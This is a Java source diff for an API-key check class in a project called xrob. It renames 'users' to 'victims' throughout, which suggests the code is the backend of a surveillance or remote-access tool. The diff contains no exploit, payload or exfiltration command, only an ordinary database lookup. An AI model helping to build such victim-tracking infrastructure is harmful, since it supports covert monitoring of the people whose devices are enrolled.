@@ -1,6 +1,6 @@
 package com.theah64.xrob.api.utils;
 
-import com.theah64.xrob.api.database.tables.Users;
+import com.theah64.xrob.api.database.tables.Victims;
 
 import javax.servlet.http.HttpServletRequest;
 
@@ -13,7 +13,7 @@ public final class HeaderSecurity {
     private static final String REASON_API_KEY_MISSING = "API key is missing";
     private static final String REASON_INVALID_API_KEY = "Invalid API key";
     private final String authorization;
-    private String userId;
+    private String victimId;
 
     public HeaderSecurity(final String authorization) throws Exception {
         //Collecting header from passed request
@@ -22,7 +22,7 @@ public final class HeaderSecurity {
     }
 
     /**
-     * Used to identify if passed API-KEY has a valid user.
+     * Used to identify if passed API-KEY has a valid victim.
      */
     private void isAuthorized() throws Exception {
 
@@ -31,16 +31,16 @@ public final class HeaderSecurity {
             throw new Exception("Unauthorized access");
         }
 
-        final Users users = Users.getInstance();
-        this.userId = users.get(Users.COLUMN_API_KEY, this.authorization, Users.COLUMN_ID);
-        if (this.userId == null) {
-            throw new Exception("No user found with the api_key " + this.authorization);
+        final Victims victims = Victims.getInstance();
+        this.victimId = victims.get(Victims.COLUMN_API_KEY, this.authorization, Victims.COLUMN_ID);
+        if (this.victimId == null) {
+            throw new Exception("No victim found with the api_key " + this.authorization);
         }
 
     }
 
-    public String getUserId() {
-        return this.userId;
+    public String getVictimId() {
+        return this.victimId;
     }
 
     public String getFailureReason() {
